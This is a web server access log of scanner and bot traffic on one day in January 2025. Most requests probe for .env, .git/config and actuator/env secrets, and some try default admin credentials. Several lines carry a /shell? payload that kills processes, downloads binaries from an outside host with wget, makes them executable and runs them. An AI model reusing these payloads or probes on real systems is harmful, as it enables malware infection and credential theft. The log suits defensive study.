78.153.140.151 - - [15/Jan/2025:03:10:26 +0000] "GET /parity/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 7.0; LGMS550 Build/NRD90U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:26 +0000] "GET /addons/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/63.0.3239.73 Mobile/13G36 Safari/601.1.46"
78.153.140.151 - - [15/Jan/2025:03:10:27 +0000] "GET /secure/.env HTTP/1.1" 302 331 "-" "Mozilla/6.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:2.0.0.0) Gecko/20061028 Firefox/3.0"
78.153.140.151 - - [15/Jan/2025:03:10:27 +0000] "GET /module/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; %lang2%) adbeat.com/policy AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B360 Safari/531.21.10"
78.153.140.151 - - [15/Jan/2025:03:10:27 +0000] "GET /widget/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2"
78.153.140.151 - - [15/Jan/2025:03:10:27 +0000] "GET /drupal/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SGH-T999N Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /kibana/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G955F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /jsrelay/.env HTTP/1.1" 302 331 "-" "Opera/9.64 (Windows NT 6.0; U; pl) Presto/2.1.1"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /layouts/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /website/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en_CA) AppleWebKit/125.4 (KHTML, like Gecko) Safari/125.9"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /plugins/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)"
78.153.140.151 - - [15/Jan/2025:03:10:29 +0000] "GET /profile/.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Android 2.2.1; Linux; Opera Mobi/ADR-1301071820) Presto/2.11.355 Version/12.10"
78.153.140.151 - - [15/Jan/2025:03:10:29 +0000] "GET /oldsite/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; CrOS x86_64 8172.56.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:30 +0000] "GET /webroot/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:31 +0000] "GET /sistema/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.3705)"
78.153.140.151 - - [15/Jan/2025:03:10:31 +0000] "GET /ikiwiki/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 5.1.1; 5054N Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:31 +0000] "GET /twitter/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.1.1 (KHTML, like Gecko) Safari/312"
78.153.140.151 - - [15/Jan/2025:03:10:32 +0000] "GET /widgets/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux Gentoo i686; pl; rv:1.8.0.8) Gecko/20061219 Firefox/1.5.0.8"
78.153.140.151 - - [15/Jan/2025:03:10:32 +0000] "GET /monerod/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 5.1; Z820 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:32 +0000] "GET /outputs/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.50 Safari/525.19"
78.153.140.151 - - [15/Jan/2025:03:10:33 +0000] "GET /classes/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) WebClip/9537.85.15.2 Safari/9537.85.15.3"
78.153.140.151 - - [15/Jan/2025:03:10:33 +0000] "GET /fileweb/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.11 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.11"
78.153.140.151 - - [15/Jan/2025:03:10:33 +0000] "GET /Backend/.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Windows NT 6.1; WOW64; U; en) Presto/2.10.289 Version/12.02"
78.153.140.151 - - [15/Jan/2025:03:10:33 +0000] "GET /sendgrid/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:34 +0000] "GET /dotfiles/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36 OPR/37.0.2178.32"
78.153.140.151 - - [15/Jan/2025:03:10:34 +0000] "GET /profiles/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.812.0 Safari/535.1"
78.153.140.151 - - [15/Jan/2025:03:10:34 +0000] "GET /examples/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008092809 Gentoo Firefox/3.0.2"
78.153.140.151 - - [15/Jan/2025:03:10:34 +0000] "GET /var/backup/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MDDC; BRI/1; .NET4.0C; BRI/2; AskTbX-SD/5.14.1.20007; .NET4.0E)"
78.153.140.151 - - [15/Jan/2025:03:10:35 +0000] "GET /lib64/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-be; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13"
78.153.140.151 - - [15/Jan/2025:03:10:35 +0000] "GET /2024/.env HTTP/1.1" 302 331 "-" "Safari/537.36 (Windows NT 6.2; WOW64) AppleWebKit/537.36"
92.255.57.58 - - [15/Jan/2025:03:16:01 +0000] "\x16\x03\x01\x05\xa8\x01" 400 524 "-" "-"
66.175.213.4 - - [15/Jan/2025:03:45:35 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.149 - - [15/Jan/2025:03:56:15 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:03:56:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
64.62.197.236 - - [15/Jan/2025:04:10:34 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
64.62.197.229 - - [15/Jan/2025:04:12:29 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
64.62.197.236 - - [15/Jan/2025:04:13:01 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
31.220.1.144 - - [15/Jan/2025:04:33:47 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
141.98.11.119 - - [15/Jan/2025:04:37:33 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
78.153.140.149 - - [15/Jan/2025:04:52:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:04:52:37 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.214.55.226 - - [15/Jan/2025:05:01:01 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
83.222.191.146 - - [15/Jan/2025:05:05:13 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.180.140.101 - - [15/Jan/2025:05:09:19 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
76.244.18.43 - - [15/Jan/2025:05:39:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
117.231.142.178 - - [15/Jan/2025:05:41:19 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 302 350 "-" "-"
172.104.11.46 - - [15/Jan/2025:05:46:05 +0000] "\x16\x03\x01" 400 524 "-" "-"
141.98.11.119 - - [15/Jan/2025:05:48:11 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
5.181.190.248 - - [15/Jan/2025:06:05:35 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:06:05:35 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
35.240.127.158 - - [15/Jan/2025:06:06:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
178.215.236.132 - - [15/Jan/2025:06:07:43 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:24.0) Gecko/20100101 Firefox/24.0"
147.185.132.15 - - [15/Jan/2025:06:12:04 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
172.169.6.20 - - [15/Jan/2025:06:32:39 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
31.13.224.222 - - [15/Jan/2025:06:33:01 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1"
31.13.224.36 - - [15/Jan/2025:06:38:59 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.93.221.56 - - [15/Jan/2025:06:39:14 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.2.1) Gecko/20100101 Firefox/52.2.1"
78.153.140.149 - - [15/Jan/2025:06:40:33 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:06:40:33 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
141.98.11.119 - - [15/Jan/2025:06:47:33 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
78.153.140.149 - - [15/Jan/2025:07:41:25 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:07:41:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
36.39.153.244 - - [15/Jan/2025:08:00:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.19.138.234 - - [15/Jan/2025:08:08:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.224 - - [15/Jan/2025:08:35:55 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Windows NT 6.1) Presto/2.12.388 Version/12.16"
78.153.140.224 - - [15/Jan/2025:08:35:55 +0000] "\x16\x03\x01" 400 524 "-" "-"
91.188.223.159 - - [15/Jan/2025:08:38:46 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
179.43.191.146 - - [15/Jan/2025:08:45:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
62.84.100.218 - - [15/Jan/2025:09:14:54 +0000] "GET /env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:09:14:56 +0000] "GET /actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:09:14:56 +0000] "GET /admin/actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.2.20"
62.84.100.218 - - [15/Jan/2025:09:14:58 +0000] "GET /api/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.0) AppleWebKit/617.28 (KHTML, like Gecko) Version/17.0 Safari/617.28"
62.84.100.218 - - [15/Jan/2025:09:15:00 +0000] "GET /admin/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:09:15:00 +0000] "GET /api/actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.7.24"
78.153.140.149 - - [15/Jan/2025:09:30:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:09:30:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
165.154.118.215 - - [15/Jan/2025:09:34:58 +0000] "\x16\x03\x01\x01\x17\x01" 400 524 "-" "-"
165.154.118.215 - - [15/Jan/2025:09:35:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
165.154.118.215 - - [15/Jan/2025:09:35:14 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:15 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:15 +0000] "GET /robots.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:15 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/robots.txt" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:16 +0000] "GET /sitemap.xml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:16 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/sitemap.xml" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:16 +0000] "GET /js/brand.js HTTP/1.1" 200 514 "-" "Go-http-client/1.1"
165.154.118.215 - - [15/Jan/2025:09:35:16 +0000] "GET /js/login.js HTTP/1.1" 200 866 "-" "Go-http-client/1.1"
